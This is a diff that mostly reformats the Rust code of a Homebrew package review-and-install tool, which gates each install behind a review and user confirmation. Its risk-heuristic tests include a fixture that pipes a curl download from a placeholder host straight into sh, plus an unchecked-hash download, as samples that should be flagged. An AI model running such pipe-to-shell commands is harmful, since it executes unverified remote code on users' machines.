@@ -19,7 +19,8 @@ const FETCH_TIMEOUT_SECONDS: u64 = 120;
 const INSTALL_TIMEOUT_SECONDS: u64 = 900;
 
 const FORMULAE_API_BASE: &str = "https://formulae.brew.sh/api";
-const CORE_FORMULA_RAW: &str = "https://raw.githubusercontent.com/Homebrew/homebrew-core/HEAD/Formula";
+const CORE_FORMULA_RAW: &str =
+    "https://raw.githubusercontent.com/Homebrew/homebrew-core/HEAD/Formula";
 const CORE_CASK_RAW: &str = "https://raw.githubusercontent.com/Homebrew/homebrew-cask/HEAD/Casks";
 
 pub fn register(registry: &mut ToolRegistry, paths: GQYPaths) {
@@ -77,14 +78,16 @@ async fn install_brew_package(args: Value, paths: GQYPaths) -> Result<String> {
         bail!("brew install requires explicit user confirmation after review: {package}")
     }
     validate_package_name(&package)?;
-    let review = review_state_for_package(&paths, &package)?
-        .ok_or_else(|| anyhow::anyhow!("Homebrew package must be reviewed before install: {package}"))?;
+    let review = review_state_for_package(&paths, &package)?.ok_or_else(|| {
+        anyhow::anyhow!("Homebrew package must be reviewed before install: {package}")
+    })?;
     if !review["install_allowed"].as_bool().unwrap_or(false) {
         bail!("Homebrew package review did not allow install: {package}")
     }
     record_install_confirmation(&paths, &package)?;
-    let review = review_state_for_package(&paths, &package)?
-        .ok_or_else(|| anyhow::anyhow!("Homebrew package must be reviewed before install: {package}"))?;
+    let review = review_state_for_package(&paths, &package)?.ok_or_else(|| {
+        anyhow::anyhow!("Homebrew package must be reviewed before install: {package}")
+    })?;
     let result = install_with_brew(&package).await?;
     Ok(serde_json::to_string_pretty(&json!({
         "ok": result["ok"].as_bool().unwrap_or(false),
@@ -130,7 +133,10 @@ async fn fetch_brew_metadata(package: &str) -> Result<(String, Value)> {
         .timeout(std::time::Duration::from_secs(20))
         .build()?;
     for kind in ["formula", "cask"] {
-        let url = format!("{FORMULAE_API_BASE}/{kind}/{}.json", urlencoding::encode(package));
+        let url = format!(
+            "{FORMULAE_API_BASE}/{kind}/{}.json",
+            urlencoding::encode(package)
+        );
         let resp = client.get(&url).send().await?;
         if !resp.status().is_success() {
             continue;
@@ -149,7 +155,8 @@ async fn fetch_formula_source(package: &str, kind: &str, root: &Path) -> Result<
         _ => ("homebrew-core", "Formula"),
     };
     let file_name = format!("{}.rb", package.split('/').last().unwrap_or(package));
-    let raw_url = format!("https://raw.githubusercontent.com/Homebrew/{repo}/HEAD/{subdir}/{file_name}");
+    let raw_url =
+        format!("https://raw.githubusercontent.com/Homebrew/{repo}/HEAD/{subdir}/{file_name}");
     let resp = reqwest::Client::builder()
         .timeout(std::time::Duration::from_secs(FETCH_TIMEOUT_SECONDS))
         .build()?
@@ -193,7 +200,8 @@ async fn install_with_brew(package: &str) -> Result<Value> {
         .stdin(Stdio::null())
         .kill_on_drop(true)
         .output();
-    let output = command_output_with_timeout(output, "brew install", INSTALL_TIMEOUT_SECONDS).await?;
+    let output =
+        command_output_with_timeout(output, "brew install", INSTALL_TIMEOUT_SECONDS).await?;
     Ok(command_result("brew install", output))
 }
 
@@ -358,8 +366,11 @@ fn record_review_state(
     });
     std::fs::write(
         brew_review_state_path(paths),
-        format!("{}
-", serde_json::to_string_pretty(&state)?),
+        format!(
+            "{}
+",
+            serde_json::to_string_pretty(&state)?
+        ),
     )?;
     Ok(())
 }
@@ -377,8 +388,11 @@ fn record_install_confirmation(paths: &GQYPaths, package: &str) -> Result<()> {
     entry["user_confirmed_at_unix"] = json!(current_unix_seconds());
     std::fs::write(
         brew_review_state_path(paths),
-        format!("{}
-", serde_json::to_string_pretty(&state)?),
+        format!(
+            "{}
+",
+            serde_json::to_string_pretty(&state)?
+        ),
     )?;
     Ok(())
 }
@@ -446,15 +460,18 @@ mod tests {
 
     #[test]
     fn heuristic_risk_blocks_pipe_to_shell() {
-        let files =
-            vec![json!({"path":"ripgrep.rb", "content":"system \"curl https://example.test/install.sh | sh\""})];
+        let files = vec![
+            json!({"path":"ripgrep.rb", "content":"system \"curl https://example.test/install.sh | sh\""}),
+        ];
         let risk = heuristic_risk(&files);
         assert_eq!(risk["level"], "high");
     }
 
     #[test]
     fn heuristic_risk_flags_network_and_no_check_as_medium() {
-        let files = vec![json!({"path":"foo.rb", "content":"url \"http://example.test/foo.tar.gz\"\nsha256 \"no_check\""})];
+        let files = vec![
+            json!({"path":"foo.rb", "content":"url \"http://example.test/foo.tar.gz\"\nsha256 \"no_check\""}),
+        ];
         let risk = heuristic_risk(&files);
         assert_eq!(risk["level"], "medium");
     }
